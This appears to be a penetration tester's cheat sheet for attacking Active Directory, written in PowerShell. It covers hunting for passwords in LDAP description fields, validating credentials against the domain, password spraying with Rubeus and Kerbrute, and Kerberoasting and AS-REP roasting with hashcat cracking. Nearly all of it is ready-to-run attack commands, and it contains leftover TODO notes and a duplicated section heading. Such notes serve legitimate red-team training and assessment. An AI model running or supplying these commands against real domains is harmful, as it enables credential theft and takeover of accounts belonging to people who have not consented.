# 1. Sensitive Data in LDAP
## Start ADExplorer and search through the AD for sensitive information
`PS> adexplorer.exe`

ADexplorer> search user description field contains pw, pwd, password, pass

## Enumerate the AD with ADRecon
`PS> .\ADRecon.ps1`

`PS> .\ADRecon.ps1 -GenExcel .\ADRecon-Report-timestamp`

TODO: wget Excel file since Excel will not be installed

## Check if the password is working
```
function Test-ADCredential {

    [CmdletBinding()]
    Param
    (
        [string]$UserName,
        [string]$Password
    )
    if (!($UserName) -or !($Password)) {
        Write-Warning 'Test-ADCredential: Please specify both user name and password'
    } else {
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain')
        $DS.ValidateCredentials($UserName, $Password)
    }
}
```

`Test-ADCredential -UserName printeradm -Password "x!3945jjlkJ2mN4QQ2"`

# 2. Password Spraying
## Identify the standard domain password and start a password spray attack
### Rubeus
`PS> .\Rubeus.exe brute /password:Start123!`

### Kerbrute
`PS> Invoke-WebRequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile ".\kerbrute.exe"`

`PS> Import-Module .\PowerView.ps1`

`PS> (Get-NetUser | select samAccountName).samAccountName > users.txt`

`PS> .\kerbrute.exe passwordspray --domain contoso.azure .\users.txt Start123!`

ToDo error

# 3. Kerberoasting
## Identify Kerberoastable users
### PowerView
`PS> Import-Module .\PowerView.ps1`

`PS> Get-NetUser | Where-Object {$_.servicePrincipalName} | fl`

`PS> Get-NetUser -SPN | ft serviceprincipalname, samaccountname, cn, pwdlastset`

### PowerView-Dev
`PS> Import-Module .\PowerView-dev.ps1`

`PS> Get-DomainUser | Where-Object {$_.servicePrincipalName} | fl`

`PS> Get-DomainUser -SPN | ft serviceprincipalname, samaccountname, cn, pwdlastset`

### Invoke-Kerberoast
`PS> Import-Module .\Invoke-Kerberoast.ps1`

`PS> Invoke-Kerberoast`

### Rubeus
`PS> .\Rubeus.exe kerberoast`

## Get TGS Kerberos Tickets
### PowerView-Dev
`PS> Import-Module .\PowerView-dev.ps1`

`Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | % { $_.Hash } | Out-File -Encoding ASCII kerberoasted.txt`

### Invoke-Kerberoast
`PS> Import-Module .\Invoke-Kerberoast.ps1`

`PS> Invoke-Kerberoast | % { $_.Hash } | Out-File -Encoding ASCII kerberoasted.txt`

### Rubeus
`PS> .\Rubeus.exe kerberoast /outfile:kerberoasted.txt`

## Crack TGS tickets
`PS> hashcat -a 0 -m 13100 kerberoasted.txt /usr/share/wordlists/rockyou.txt`

# 3. Kerberoasting
## Identify AS-REP roastable users
### PowerView-Dev
`PS> Get-DomainUser -PreauthNotRequired | ft samaccountname, pwdlastset`

`PS> Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED | ft samaccountname, pwdlastset`

### Rubeus
`PS> .\Rubeus.exe asreproast`

### Invoke-ASREPRoast
`PS> Import-Module .\Invoke-ASREPRoast.ps1`

`PS> Invoke-ASREPRoast`

## ASREPRoasting
### Rubeus
`PS> .\Rubeus.exe asreproast /format:hashcat /outfile:asrephashes.txt`

### Invoke-ASREPRoast
`PS> Invoke-ASREPRoast | % { $_.Hash } | Out-File -Encoding ASCII asrephashes.txt`

## Cracking AS-REP hash with Hashcat
`PS> hashcat -a 0 -m 18200 asrephashes.txt /usr/share/wordlists/rockyou.txt`
